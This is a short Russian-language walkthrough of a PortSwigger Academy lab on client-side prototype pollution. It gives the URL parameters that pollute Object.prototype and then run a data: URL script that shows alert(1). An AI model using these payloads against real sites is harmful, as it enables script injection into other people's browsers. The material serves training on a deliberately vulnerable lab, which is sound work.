Перейдем на уязвимый ресурс, и модифицируем URL на
```
https://0a35005003ffb22b8096bc63005e00b0.web-security-academy.net/?__proto__[value]=car
```

так же в DevTools заметим 
```
Object.prototype

{value: 'car', a42e5579: 'lcfrh0xe', dcb52823: 'lcfrh0xe', constructor: ƒ, __defineGetter__: ƒ, …}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/28.%20Prototype%20pollution/1.%20Client-side%20prototype%20pollution%20via%20browser%20APIs/pics%20for%20walkthrough/2.png)

что ознначает нашу инъекцию успешной

далее перейдем в `Sources` -> `resources` -> `js` -> `searchLoggerConfigurable.js`

и увидим следующий `js` код, что выпал в ошибку
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/28.%20Prototype%20pollution/1.%20Client-side%20prototype%20pollution%20via%20browser%20APIs/pics%20for%20walkthrough/1.png)
```
/?__proto__[value]=data:,alert(1);
```
модифицируем запрос и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/28.%20Prototype%20pollution/1.%20Client-side%20prototype%20pollution%20via%20browser%20APIs/pics%20for%20walkthrough/3.png)
